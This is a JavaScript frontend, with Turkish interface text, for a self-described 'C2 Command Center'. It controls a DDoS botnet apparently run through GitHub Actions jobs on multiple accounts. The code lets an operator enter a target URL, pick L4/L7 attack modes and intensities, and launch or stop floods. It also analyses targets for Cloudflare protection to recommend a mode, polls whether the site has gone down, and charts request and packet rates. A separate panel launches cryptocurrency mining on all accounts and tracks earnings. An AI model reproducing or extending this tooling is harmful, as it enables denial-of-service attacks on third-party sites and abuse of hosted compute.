// ═══════════════════════════════════════════════
// C2 COMMAND CENTER — Frontend v2.0
// ═══════════════════════════════════════════════

const socket = io();
let accountsLoaded = false;
let attackStartTime = null;
let timerInterval = null;
let healthInterval = null;
let lastActiveCount = 0;

// ═══ TOAST ═══
function toast(msg, type = 'info') {
    const el = document.createElement('div');
    el.className = `toast toast-${type}`;
    el.textContent = msg;
    document.getElementById('toastContainer').appendChild(el);
    setTimeout(() => el.remove(), 3000);
}

// ═══ LOG ═══
function log(msg, type = 'action') {
    const el = document.getElementById('actionLog');
    const welcome = el.querySelector('.log-welcome');
    if (welcome) welcome.remove();

    const time = new Date().toLocaleTimeString();
    const line = document.createElement('div');
    line.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-${type}">${msg}</span>`;
    el.appendChild(line);
    el.scrollTop = el.scrollHeight;
}

// ═══ NUMBER ANIMATION ═══
function animateNum(el, newVal) {
    const old = el.textContent;
    if (old !== String(newVal)) {
        el.textContent = newVal;
        el.classList.remove('num-change');
        void el.offsetWidth; // force reflow
        el.classList.add('num-change');
    }
}

// ═══ TARGET HISTORY (localStorage) ═══
function getTargetHistory() {
    try { return JSON.parse(localStorage.getItem('c2_targets') || '[]'); } catch { return []; }
}
function addTargetHistory(url) {
    if (!url) return;
    let hist = getTargetHistory().filter(u => u !== url);
    hist.unshift(url);
    hist = hist.slice(0, 15);
    localStorage.setItem('c2_targets', JSON.stringify(hist));
    updateTargetDatalist();
}
function updateTargetDatalist() {
    const dl = document.getElementById('targetHistory');
    if (!dl) return;
    dl.innerHTML = getTargetHistory().map(u => `<option value="${u}">`).join('');
}
updateTargetDatalist();

// ═══ GENERATE RANDOM CHANNEL ═══
function generateChannel() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let id = 'c2-';
    for (let i = 0; i < 12; i++) id += chars[Math.floor(Math.random() * chars.length)];
    document.getElementById('reportChannel').value = id;
    toast('Kanal: ' + id, 'success');
}

// ═══ CHART ═══
const chartData = { labels: [], rps: [], mbps: [], pps: [] };
const MAX_POINTS = 40;

const chart = new Chart(document.getElementById('liveChart'), {
    type: 'line',
    data: {
        labels: chartData.labels,
        datasets: [
            {
                label: 'RPS',
                data: chartData.rps,
                borderColor: '#3fb950',
                backgroundColor: 'rgba(63,185,80,0.08)',
                fill: true, tension: 0.4, yAxisID: 'y',
                borderWidth: 2, pointRadius: 0, pointHitRadius: 10
            },
            {
                label: 'Mbps',
                data: chartData.mbps,
                borderColor: '#d29922',
                backgroundColor: 'rgba(210,153,34,0.08)',
                fill: true, tension: 0.4, yAxisID: 'y1',
                borderWidth: 2, pointRadius: 0, pointHitRadius: 10
            },
            {
                label: 'PPS',
                data: chartData.pps,
                borderColor: '#bc8cff',
                backgroundColor: 'rgba(188,140,255,0.05)',
                fill: false, tension: 0.4, yAxisID: 'y1',
                borderWidth: 1, borderDash: [4, 4], pointRadius: 0,
                hidden: true
            }
        ]
    },
    options: {
        responsive: true,
        maintainAspectRatio: false,
        interaction: { mode: 'index', intersect: false },
        plugins: {
            legend: {
                labels: { color: '#8b949e', usePointStyle: true, pointStyle: 'circle', padding: 16, font: { size: 11 } }
            },
            tooltip: {
                backgroundColor: 'rgba(22,27,34,0.95)',
                borderColor: '#30363d', borderWidth: 1,
                titleColor: '#e6edf3', bodyColor: '#c9d1d9',
                padding: 10, cornerRadius: 8
            }
        },
        scales: {
            x: {
                ticks: { color: '#6e7681', maxTicksLimit: 10, font: { size: 10 } },
                grid: { color: 'rgba(48,54,61,0.3)' }
            },
            y: {
                type: 'linear', position: 'left',
                title: { display: true, text: 'RPS', color: '#3fb950', font: { size: 11 } },
                ticks: { color: '#3fb950', font: { size: 10 } },
                grid: { color: 'rgba(48,54,61,0.3)' },
                beginAtZero: true
            },
            y1: {
                type: 'linear', position: 'right',
                title: { display: true, text: 'Mbps', color: '#d29922', font: { size: 11 } },
                ticks: { color: '#d29922', font: { size: 10 } },
                grid: { drawOnChartArea: false },
                beginAtZero: true
            }
        }
    }
});

function pushChart(time, rps, mbps, pps) {
    chartData.labels.push(time);
    chartData.rps.push(rps);
    chartData.mbps.push(mbps);
    chartData.pps.push(pps || 0);
    if (chartData.labels.length > MAX_POINTS) {
        chartData.labels.shift();
        chartData.rps.shift();
        chartData.mbps.shift();
        chartData.pps.shift();
    }
    chart.update('none');
}

// ═══ INTENSITIES ═══
const INTENSITIES = {
    '1': { duration: '60s', vus: '100', jobs: '5' },
    '2': { duration: '120s', vus: '300', jobs: '20' },
    '3': { duration: '5m', vus: '500', jobs: '20' },
    '4': { duration: '20m', vus: '500', jobs: '20' }
};

function onIntensityChange() {
    const v = document.getElementById('intensity').value;
    document.getElementById('customInputs').style.display = v === 'custom' ? 'block' : 'none';
}

function getAttackParams() {
    const v = document.getElementById('intensity').value;
    if (v === 'custom') {
        return {
            duration: document.getElementById('customDuration').value || '120s',
            vus: document.getElementById('customVus').value || '300',
            jobs: document.getElementById('customJobs').value || '20'
        };
    }
    return INTENSITIES[v];
}

// ═══ ATTACK TIMER ═══
function startTimer() {
    attackStartTime = Date.now();
    const timerEl = document.getElementById('attackTimer');
    timerEl.style.display = 'flex';
    if (timerInterval) clearInterval(timerInterval);
    timerInterval = setInterval(() => {
        const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
        const m = String(Math.floor(elapsed / 60)).padStart(2, '0');
        const s = String(elapsed % 60).padStart(2, '0');
        document.getElementById('timerText').textContent = `${m}:${s}`;
    }, 1000);
}

function stopTimer() {
    if (timerInterval) clearInterval(timerInterval);
    document.getElementById('attackTimer').style.display = 'none';
    attackStartTime = null;
}

// ═══ AUTO HEALTH POLLING ═══
function startHealthPolling() {
    const url = document.getElementById('targetUrl').value.trim();
    if (!url || healthInterval) return;
    healthInterval = setInterval(async () => {
        try {
            const r = await fetch('/api/health?url=' + encodeURIComponent(url));
            const hd = await r.json();
            renderHealth(hd);
        } catch (e) { /* skip */ }
    }, 15000);
}

function stopHealthPolling() {
    if (healthInterval) { clearInterval(healthInterval); healthInterval = null; }
}

function renderHealth(hd) {
    let hhtml = '';
    let allUp = true;
    hd.forEach((t, i) => {
        const cls = t.ok ? (t.ms > 2000 ? 'slow' : 'up') : 'down';
        if (!t.ok || t.ms > 2000) allUp = false;
        hhtml += `<span class="health-dot ${cls}"></span>Test ${i + 1}: ${t.ok ? t.status + ' (' + t.ms + 'ms)' : 'FAIL'} &nbsp; `;
    });
    document.getElementById('healthResult').innerHTML = hhtml;
    const badge = document.getElementById('healthBadge');
    if (allUp) { badge.textContent = 'UP'; badge.style.color = 'var(--green)'; }
    else { badge.textContent = 'DOWN'; badge.style.color = 'var(--red)'; }
}

// ═══ TOGGLE ALL ACCOUNTS ═══
function toggleAllAccounts(checked) {
    document.querySelectorAll('#accCheckboxes input[type="checkbox"]').forEach(cb => cb.checked = checked);
}

// ═══ SOCKET EVENTS ═══
socket.on('connect', () => {
    document.getElementById('connDot').classList.add('online');
    document.getElementById('connText').textContent = 'Bağlı';
    toast('Dashboard bağlandı', 'success');
    // Hide loading after first connection
    setTimeout(() => document.getElementById('loadingOverlay').classList.add('hidden'), 500);
});

socket.on('disconnect', () => {
    document.getElementById('connDot').classList.remove('online');
    document.getElementById('connText').textContent = 'Bağlantı kesildi';
});

socket.on('status', (d) => {
    updateStatus(d);
    updateBotDetails(d);
    updateSummary(d);
});

// Hızlı live update (3sn, ntfy/report'tan)
socket.on('live', (live) => {
    if (!live || !live.sample_count) return;
    const rps = live.est_rps || 0;
    const mbps = live.est_mbps || 0;
    const pps = live.est_pps || 0;
    const reqs = live.est_total_reqs || 0;
    const samples = live.sample_count || 0;

    animateNum(document.getElementById('gRps'), rps.toLocaleString());
    document.getElementById('gRpsSub').textContent = `${samples} bot (canlı)`;
    if (mbps > 1000) {
        animateNum(document.getElementById('gBw'), (mbps / 1000).toFixed(1));
        document.getElementById('gBwUnit').textContent = 'Gbps';
    } else {
        animateNum(document.getElementById('gBw'), mbps);
        document.getElementById('gBwUnit').textContent = 'Mbps';
    }
    animateNum(document.getElementById('gPps'), pps > 0 ? pps.toLocaleString() : '0');
    animateNum(document.getElementById('gReqs'), reqs > 1e6 ? (reqs / 1e6).toFixed(1) + 'M' : reqs.toLocaleString());
    document.getElementById('gReqsSub').textContent = `${samples} bot (canlı)`;
    document.getElementById('chartSamples').textContent = `${samples} bot`;

    const time = new Date().toLocaleTimeString().slice(0, 5);
    pushChart(time, rps, mbps, pps);

    // Bot details update
    if (live.bot_details?.length) {
        const card = document.getElementById('botDetailsCard');
        const grid = document.getElementById('botDetailsGrid');
        card.style.display = 'block';
        grid.innerHTML = '';
        live.bot_details.forEach(bot => {
            const isL4 = bot.type === 'L4';
            let html = `<div class="bot-detail">
              <div class="bot-head ${isL4 ? 'l4' : 'l7'}">Bot #${bot.botId} (${bot.account}) ${bot.elapsed ? `${bot.elapsed}s` : ''}</div>`;
            if (isL4) {
                html += `<div class="bot-metric"><span>PPS</span><span class="val">${(bot.pps || 0).toLocaleString()}</span></div>
                  <div class="bot-metric"><span>Mbps</span><span class="val">${bot.mbps || 0}</span></div>`;
            } else {
                html += `<div class="bot-metric"><span>RPS</span><span class="val">${(bot.rps || 0).toLocaleString()}</span></div>
                  <div class="bot-metric"><span>İstek</span><span class="val">${(bot.reqs || 0).toLocaleString()}</span></div>
                  <div class="bot-metric"><span>VUs</span><span class="val">${bot.vus || 0}</span></div>
                  <div class="bot-metric"><span>2xx</span><span class="val">${bot.pct2xx || 0}%</span></div>`;
            }
            html += '</div>';
            grid.innerHTML += html;
        });
    }
});

socket.on('log', (msg) => { log(msg, 'action'); toast(msg, 'info'); });

// ═══ UPDATE STATUS ═══
function updateStatus(d) {
    document.getElementById('lastUpdate').textContent = d.timestamp;

    // Grand stats
    animateNum(document.getElementById('gActive'), d.grand.active);
    animateNum(document.getElementById('gTotal'), d.grand.total_bots);
    animateNum(document.getElementById('gFail'), d.grand.fail);

    // Live metrics
    const rps = d.live?.est_rps || 0;
    const mbps = d.live?.est_mbps || 0;
    const reqs = d.live?.est_total_reqs || 0;
    const pps = d.live?.est_pps || 0;
    const samples = d.live?.sample_count || 0;

    animateNum(document.getElementById('gRps'), rps.toLocaleString());
    document.getElementById('gRpsSub').textContent = samples > 0
        ? `${samples} bot logdan` : 'bekleniyor';

    if (mbps > 1000) {
        animateNum(document.getElementById('gBw'), (mbps / 1000).toFixed(1));
        document.getElementById('gBwUnit').textContent = 'Gbps';
    } else {
        animateNum(document.getElementById('gBw'), mbps);
        document.getElementById('gBwUnit').textContent = 'Mbps';
    }

    animateNum(document.getElementById('gPps'), pps > 0 ? pps.toLocaleString() : '0');

    animateNum(document.getElementById('gReqs'),
        reqs > 1e6 ? (reqs / 1e6).toFixed(1) + 'M' : reqs.toLocaleString());
    document.getElementById('gReqsSub').textContent = samples > 0
        ? `${samples} bot logdan` : 'bekleniyor';

    // Chart
    pushChart(d.timestamp, rps, mbps, pps);
    document.getElementById('chartSamples').textContent = `${samples} sample`;

    // Stats panel
    document.getElementById('sAccounts').textContent = d.accounts.length;
    document.getElementById('sActive').textContent = d.grand.active;
    document.getElementById('sQueued').textContent = d.grand.queued;
    document.getElementById('sDone').textContent = d.grand.done;
    document.getElementById('sOk').textContent = d.grand.ok;
    document.getElementById('sFail').textContent = d.grand.fail;
    document.getElementById('sRuns').textContent =
        d.accounts.filter(a => a.run && a.run.status !== 'completed').length;

    // Timer management
    if (d.grand.active > 0 && lastActiveCount === 0) startTimer();
    else if (d.grand.active === 0 && lastActiveCount > 0) stopTimer();
    lastActiveCount = d.grand.active;

    // Auto health polling
    if (d.grand.active > 0 && !healthInterval) startHealthPolling();
    else if (d.grand.active === 0 && healthInterval) stopHealthPolling();

    // Account grid
    const grid = document.getElementById('accountGrid');
    grid.innerHTML = '';
    d.accounts.forEach(a => {
        const status = a.run ? (a.run.conclusion || a.run.status) : 'idle';
        const link = a.run ? `https://github.com/${a.user}/${a.repo}/actions/runs/${a.run.id}` : '#';
        const cardClass = a.active > 0 ? 'active' : (a.fail > 0 ? 'failed' : (status === 'idle' ? 'idle' : ''));
        const totalBots = a.active + a.done + a.queued;
        const pct = totalBots > 0 ? Math.round((a.done / totalBots) * 100) : 0;
        const barColor = a.fail > 0 ? 'red' : (a.active > 0 ? 'green' : 'yellow');

        grid.innerHTML += `
      <div class="acc-card ${cardClass}">
        <div class="name"><a href="${link}" target="_blank">#${a.id} ${a.user}</a></div>
        <div class="meta">${a.repo} · ${status}</div>
        <div class="counts">
          <span class="c c-active">${a.active} aktif</span>
          <span class="c c-queue">${a.queued} kuyruk</span>
          <span class="c c-ok">${a.ok} ok</span>
          ${a.fail > 0 ? `<span class="c c-fail">${a.fail} fail</span>` : ''}
        </div>
        ${totalBots > 0 ? `<div class="acc-progress"><div class="acc-progress-bar ${barColor}" style="width:${pct}%"></div></div>` : ''}
      </div>`;
    });

    // Build checkboxes once
    if (!accountsLoaded && d.accounts.length) {
        accountsLoaded = true;
        const cb = document.getElementById('accCheckboxes');
        cb.innerHTML = '';
        d.accounts.forEach(a => {
            cb.innerHTML += `<label><input type="checkbox" value="${a.id}" checked> #${a.id} ${a.user}</label>`;
        });
    }
}

// ═══ BOT DETAILS ═══
function updateBotDetails(d) {
    const details = d.live?.bot_details || [];
    const card = document.getElementById('botDetailsCard');
    const grid = document.getElementById('botDetailsGrid');

    if (!details.length) { card.style.display = 'none'; return; }
    card.style.display = 'block';
    grid.innerHTML = '';

    details.forEach(bot => {
        const isL4 = bot.type === 'L4';
        let html = `<div class="bot-detail">
      <div class="bot-head ${isL4 ? 'l4' : 'l7'}">Bot #${bot.botId} — ${bot.type} ${bot.elapsed ? `(${bot.elapsed}s)` : ''}</div>`;

        if (isL4) {
            html += `
        <div class="bot-metric"><span>PPS</span><span class="val">${(bot.pps || 0).toLocaleString()}</span></div>
        <div class="bot-metric"><span>Bandwidth</span><span class="val">${bot.mbps || 0} Mbps${bot.gbps ? ` (${bot.gbps} Gbps)` : ''}</span></div>
        <div class="bot-metric"><span>UDP Paket</span><span class="val">${(bot.udpPkts || 0).toLocaleString()}</span></div>
        <div class="bot-metric"><span>Raw Paket</span><span class="val">${(bot.rawPkts || 0).toLocaleString()}</span></div>
        <div class="bot-metric"><span>Hata</span><span class="val">${bot.errors || 0}</span></div>`;
        } else {
            html += `
        <div class="bot-metric"><span>RPS</span><span class="val">${(bot.rps || 0).toLocaleString()}</span></div>
        <div class="bot-metric"><span>İstek</span><span class="val">${(bot.iters || 0).toLocaleString()}</span></div>
        <div class="bot-metric"><span>VUs</span><span class="val">${bot.vus || 0}</span></div>
        <div class="bot-metric"><span>Bandwidth</span><span class="val">${bot.mbps || 0} Mbps</span></div>
        <div class="bot-metric"><span>2xx</span><span class="val" style="color:var(--green)">${bot.pct2xx || 0}%</span></div>
        <div class="bot-metric"><span>5xx</span><span class="val" style="color:var(--red)">${bot.pct5xx || 0}%</span></div>
        <div class="bot-metric"><span>429</span><span class="val" style="color:var(--yellow)">${bot.pct429 || 0}%</span></div>`;
        }
        html += '</div>';
        grid.innerHTML += html;
    });
}

// ═══ SUMMARY ═══
function updateSummary(d) {
    const card = document.getElementById('summaryCard');
    const el = document.getElementById('summaryResult');
    const s = d.lastSummary;

    if (!s) { card.style.display = 'none'; return; }
    card.style.display = 'block';

    el.innerHTML = `<div class="summary-grid">
    <div class="summary-item"><div class="s-val">${(s.totalReqs || 0).toLocaleString()}</div><div class="s-label">Toplam İstek</div></div>
    <div class="summary-item"><div class="s-val">${s.totalMBIn || 0} MB</div><div class="s-label">Alınan Veri</div></div>
    <div class="summary-item"><div class="s-val">${s.totalMBOut || 0} MB</div><div class="s-label">Gönderilen Veri</div></div>
    <div class="summary-item"><div class="s-val">${s.botCount || 0}</div><div class="s-label">Rapor Gelen Bot</div></div>
  </div>`;
}

// ═══ HELPERS ═══
function getSelectedAccounts() {
    return Array.from(document.querySelectorAll('#accCheckboxes input:checked')).map(c => parseInt(c.value));
}

// ═══ LAUNCH ATTACK ═══
async function launchAttack() {
    const target = document.getElementById('targetUrl').value.trim();
    if (!target) { toast('Hedef URL gir!', 'error'); return; }
    const mode = document.getElementById('attackMode').value;
    const params = getAttackParams();
    const host = document.getElementById('hostHeader').value.trim();
    const accs = getSelectedAccounts();
    if (!accs.length) { toast('En az 1 hesap seç!', 'error'); return; }

    addTargetHistory(target);

    const btn = document.getElementById('btnFire');
    btn.innerHTML = '<span class="btn-icon">⏳</span> TETİKLENİYOR...';
    btn.disabled = true;

    log(`ATTACK → ${target} | mode=${mode} | ${params.duration}/${params.vus}VU/${params.jobs}bot | hesap=${accs.join(',')}`, 'action');

    try {
        const r = await fetch('/api/attack', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                target, mode, duration: params.duration,
                vus: parseInt(params.vus), jobs: parseInt(params.jobs),
                host_header: host,
                report_channel: document.getElementById('reportChannel').value.trim(),
                accounts: accs
            })
        });
        const d = await r.json();
        d.forEach(res => log(`  #${res.id} ${res.user}: ${res.result}`, res.result === 'OK' ? 'success' : 'error'));
        const total = accs.length * parseInt(params.jobs);
        log(`TRIGGER OK — ${accs.length} hesap × ${params.jobs} bot = ${total} toplam bot`, 'success');
        toast(`Saldırı başlatıldı! ${total} bot`, 'success');
        startTimer();
        startHealthPolling();
    } catch (e) {
        log('HATA: ' + e.message, 'error');
        toast('Saldırı başlatılamadı!', 'error');
    }

    btn.innerHTML = '<span class="btn-icon">🔥</span> ATEŞ ET';
    btn.disabled = false;
}

// ═══ STOP ATTACK ═══
async function stopAttack() {
    const accs = getSelectedAccounts();
    if (!confirm(`${accs.length} hesabın tüm run'ları iptal edilecek. Emin misin?`)) return;

    log('DURDURMA BAŞLATILIYOR...', 'action');
    try {
        const r = await fetch('/api/stop', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ accounts: accs })
        });
        const d = await r.json();
        d.forEach(res => log(`  #${res.id} ${res.user}: ${res.result}`, 'success'));
        log('DURDURMA TAMAMLANDI', 'success');
        toast('Tüm saldırılar durduruldu', 'success');
        stopTimer();
        stopHealthPolling();
    } catch (e) {
        log('HATA: ' + e.message, 'error');
        toast('Durdurma hatası!', 'error');
    }
}

// ═══ ANALYZE ═══
async function analyzeTarget() {
    const url = document.getElementById('targetUrl').value.trim();
    if (!url) { toast('URL gir!', 'error'); return; }

    addTargetHistory(url);
    log('ANALİZ → ' + url, 'action');
    document.getElementById('analyzeCard').style.display = 'block';
    document.getElementById('analyzeResult').innerHTML = '<div style="color:var(--dim)">Analiz ediliyor...</div>';

    try {
        const r = await fetch('/api/analyze?url=' + encodeURIComponent(url));
        const d = await r.json();

        let html = `
      <div class="stat-row"><span class="stat-label">IP</span><span class="stat-val">${d.ip || '—'}</span></div>
      <div class="stat-row"><span class="stat-label">Server</span><span class="stat-val">${d.server || '—'}</span></div>
      <div class="stat-row"><span class="stat-label">Cloudflare</span><span class="stat-val" style="color:${d.cf ? 'var(--yellow)' : 'var(--green)'}">${d.cf ? '⚠️ EVET' : '✅ HAYIR'}</span></div>
      <div class="stat-row"><span class="stat-label">CF Cache</span><span class="stat-val">${d.cache || 'N/A'}</span></div>
      <div class="stat-row"><span class="stat-label">Origin RTT</span><span class="stat-val">${d.origin_ms || 0}ms</span></div>
      <div class="stat-row"><span class="stat-label">Status</span><span class="stat-val">${d.status || '—'}</span></div>`;

        if (d.error) {
            html += `<div class="stat-row"><span class="stat-label">Hata</span><span class="stat-val red">${d.error}</span></div>`;
        }

        html += `<div class="stat-row" style="border-top:2px solid var(--accent);padding-top:10px;margin-top:10px">
      <span class="stat-label" style="font-weight:700">Önerilen Mod</span>
      <span class="stat-val blue" style="font-size:13px">${d.recommendation || '—'}</span>
    </div>`;

        document.getElementById('analyzeResult').innerHTML = html;
        log(`ANALİZ: ${d.server || '?'} | CF=${d.cf} | ${d.origin_ms}ms | ${d.status}`, 'success');
        toast('Analiz tamamlandı', 'success');

        // Health check
        const hr = await fetch('/api/health?url=' + encodeURIComponent(url));
        const hd = await hr.json();
        renderHealth(hd);
    } catch (e) {
        log('ANALİZ HATASI: ' + e.message, 'error');
        toast('Analiz hatası!', 'error');
    }
}

// ═══ FALLBACK POLLING ═══
setInterval(async () => {
    if (!socket.connected) {
        try {
            const r = await fetch('/api/status');
            const d = await r.json();
            updateStatus(d);
            updateBotDetails(d);
            updateSummary(d);
        } catch (e) { /* skip */ }
    }
}, 8000);

// ═══════════════════════════════════════════════
// MINING PANEL
// ═══════════════════════════════════════════════

socket.on('mining', (m) => {
    if (!m) return;
    const hr = m.totalHashrate || 0;
    let hrDisplay, hrUnit;
    if (hr >= 1000000) { hrDisplay = (hr / 1000000).toFixed(2); hrUnit = 'MH/s'; }
    else if (hr >= 1000) { hrDisplay = (hr / 1000).toFixed(2); hrUnit = 'KH/s'; }
    else { hrDisplay = hr; hrUnit = 'H/s'; }

    animateNum(document.getElementById('mHashrate'), hrDisplay);
    document.getElementById('mHashrateUnit').textContent = hrUnit;
    animateNum(document.getElementById('mWorkers'), m.activeWorkers || 0);
    animateNum(document.getElementById('mShares'), m.totalShares || 0);

    // Earnings estimate (2026 realistic: ~$6/day per MH/s)
    const earnings = (hr / 1000000) * 6;
    document.getElementById('mEarnings').textContent = '$' + earnings.toFixed(2);

    // CPU usage %
    const cpuEl = document.getElementById('mCpuPct');
    if (cpuEl) {
        animateNum(cpuEl, (m.avgCpuPct || 0) + '%');
        const subEl = document.getElementById('mCpuSub');
        if (subEl) subEl.textContent = 'max: ' + (m.totalMaxHashrate || 0).toLocaleString() + ' H/s';
    }

    // Workers grouped by account
    const grid = document.getElementById('miningWorkersGrid');
    if (!m.workers || m.workers.length === 0) {
        grid.innerHTML = '<div style="color:var(--dim);font-size:12px;padding:12px;text-align:center">Mining aktif değil. "BAŞLAT" butonuna tıkla, ~2 dakika sonra veriler gelmeye başlar.</div>';
        return;
    }

    const byAcc = {};
    m.workers.forEach(w => {
        if (!byAcc[w.account]) byAcc[w.account] = [];
        byAcc[w.account].push(w);
    });

    grid.innerHTML = '';
    Object.entries(byAcc).forEach(([acc, workers]) => {
        const accHr = workers.reduce((s, w) => s + w.hashrate, 0);
        const accShares = workers.reduce((s, w) => s + w.shares, 0);
        grid.innerHTML += `
          <div class="bot-detail">
            <div class="bot-head" style="color:var(--purple)">${acc} — ${workers.length} worker</div>
            <div class="bot-metric"><span>Hashrate</span><span class="val">${accHr.toLocaleString()} H/s</span></div>
            <div class="bot-metric"><span>Shares</span><span class="val">${accShares}</span></div>
            <div class="bot-metric"><span>Kazanç/gün</span><span class="val" style="color:var(--green)">$${((accHr / 1000000) * 28).toFixed(3)}</span></div>
          </div>`;
    });
});

async function startMining() {
    if (!confirm('Tüm 6 hesapta mining pipeline başlatılacak. Onaylıyor musun?')) return;
    log('MINING: Başlatılıyor...', 'action');
    try {
        const r = await fetch('/api/mining/start', { method: 'POST' });
        const d = await r.json();
        d.forEach(res => log(`  ${res.user}: ${res.result}`, res.result === 'OK' ? 'success' : 'error'));
        const ok = d.filter(x => x.result === 'OK').length;
        toast(`Mining başlatıldı: ${ok} hesap`, 'success');
    } catch (e) {
        log('MINING HATA: ' + e.message, 'error');
        toast('Mining başlatılamadı!', 'error');
    }
}

async function stopMining() {
    if (!confirm('Tüm mining işleri durdurulacak. Emin misin?')) return;
    log('MINING: Durduruluyor...', 'action');
    try {
        const r = await fetch('/api/mining/stop', { method: 'POST' });
        const d = await r.json();
        d.forEach(res => log(`  ${res.user}: ${res.result}`, 'success'));
        toast('Mining durduruldu', 'success');
    } catch (e) {
        log('MINING STOP HATA: ' + e.message, 'error');
    }
}